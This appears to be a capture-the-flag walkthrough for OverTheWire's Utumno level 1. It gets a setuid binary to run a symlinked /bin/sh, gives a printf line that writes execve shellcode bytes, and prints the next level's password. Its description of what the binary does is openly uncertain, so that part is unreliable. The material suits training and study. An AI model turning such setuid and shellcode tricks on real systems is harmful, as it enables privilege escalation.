# Utumno Level 1 → 2

## Goal

`utumno1` looks for a file named `code` (or similar) in its working directory and executes it. If `code` is a symlink to `/bin/sh`, the setuid binary runs a shell as `utumno2`.

## Concepts you'll learn

- Tracing library and syscall behaviour with `ltrace` / `strace` to see what path a binary opens
- Using symlinks to redirect file-open operations
- Running a binary from a directory you control so its relative paths resolve where you want

## Walkthrough

### 1. Watch what the binary does

```bash
$ cd /utumno
$ ltrace ./utumno1 2>&1 | head -30
$ strace ./utumno1 2>&1 | grep -E 'open|exec'
```

You'll see it opens or execs something like `./code` or iterates through files starting with `sh_`. The exact shape varies by version — read the output carefully.

### 2. Build a working directory with a symlink

```bash
$ mkdir /tmp/u1
$ cd /tmp/u1
$ ln -s /bin/sh code
$ ls -l code
lrwxrwxrwx 1 utumno1 utumno1 ... code -> /bin/sh
```

### 3. Run `utumno1` from there

```bash
$ /utumno/utumno1
```

The binary searches for `code` in the current directory, finds your symlink, and executes `/bin/sh` — as `utumno2` because `utumno1` is setuid.

```bash
$ whoami
utumno2
$ cat /etc/utumno_pass/utumno2
aathaeyiew
```

### 4. If it needs shellcode instead of `/bin/sh`

Some iterations of this level expect the file to be a raw binary blob it executes directly. If that's the case, assemble a small piece of shellcode that runs `/bin/sh` and write the raw bytes to `code`:

```bash
$ printf '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80' > code
$ chmod +x code
$ /utumno/utumno1
```

## The answer

The password for `utumno2` is:

**`aathaeyiew`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/utumno/utumno1.html>
